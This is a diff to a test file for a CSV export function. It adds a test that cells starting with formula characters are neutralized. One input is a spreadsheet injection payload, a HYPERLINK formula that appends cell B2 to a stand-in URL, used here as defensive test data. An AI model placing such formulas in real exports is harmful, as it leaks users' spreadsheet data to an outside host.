@@ -20,6 +20,20 @@ describe('CSV transaction exports', () => {
 		).toBe('Keterangan,Jumlah\n"Kopi, susu",25000\n"Dia bilang ""lunas""","baris\nbaru"');
 	});
 
+	it('neutralizes text that a spreadsheet would run as a formula', () => {
+		expect(
+			serializeCsvRows([
+				['=HYPERLINK("https://x.test/?"&B2,"Lihat")', '+62812', '-5', '@SUM(A1)', 'Kopi'],
+				[-25_000, 0, '\tTab', '\rCR', 'Kas=Bank'],
+				['-', '+', 'Diskon - 10%']
+			])
+		).toBe(
+			`"'=HYPERLINK(""https://x.test/?""&B2,""Lihat"")",'+62812,'-5,'@SUM(A1),Kopi\n` +
+				`-25000,0,'\tTab,"'\rCR",Kas=Bank\n` +
+				`-,+,Diskon - 10%`
+		);
+	});
+
 	it('downloads CSV without importing the spreadsheet runtime', async () => {
 		const click = vi.fn();
 		const link = { href: '', download: '', click };
